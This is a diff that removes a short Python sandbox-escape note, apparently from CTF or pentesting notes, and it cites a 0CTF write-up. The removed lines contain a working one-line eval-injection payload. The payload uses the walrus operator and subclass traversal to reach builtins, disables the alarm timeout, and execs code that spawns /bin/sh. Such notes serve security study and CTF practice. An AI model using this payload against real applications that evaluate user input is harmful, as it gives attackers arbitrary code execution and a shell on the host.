@@ -1,6 +1,0 @@
-# walrus operator allows generating variable inside a list
-## everything will be executed in order
-## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
-[a:=21,a*2]
-[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
-## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
